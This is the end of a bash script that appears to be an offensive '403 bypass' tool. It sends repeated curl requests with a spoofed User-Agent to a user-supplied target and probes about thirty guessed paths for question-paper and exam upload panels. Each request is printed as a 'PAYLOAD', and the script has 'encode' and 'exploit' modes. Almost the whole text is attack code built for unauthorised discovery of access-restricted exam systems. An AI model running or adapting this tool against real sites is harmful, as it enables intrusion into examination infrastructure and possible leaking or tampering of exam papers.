code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperPlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperPlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadAccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadAccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print


}
function 403bypass(){ 
	URL_Encode_Bypass
}
function prg(){
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f4- )
					domain=$(echo $2 | cut -d "/" -f3)
					shift
					;;
			## modes
			
			'--encode')
				mode='encode'
				;;
      '--exploit')
				mode='exploit'
				;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [[ -z "${mode}" ]];then
        printf "\n[${red}!${end}] ${yellow}No mode given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi

	
	if [ "${mode}" == 'encode' ];then
			echo "encode"
			banner
        	URL_Encode_Bypass
        	exit 0
	elif [ "${mode}" == 'exploit' ];then
			echo "exploit"
        	banner
			403bypass
        	exit 0
	fi
}
prg $@
tput sgr0
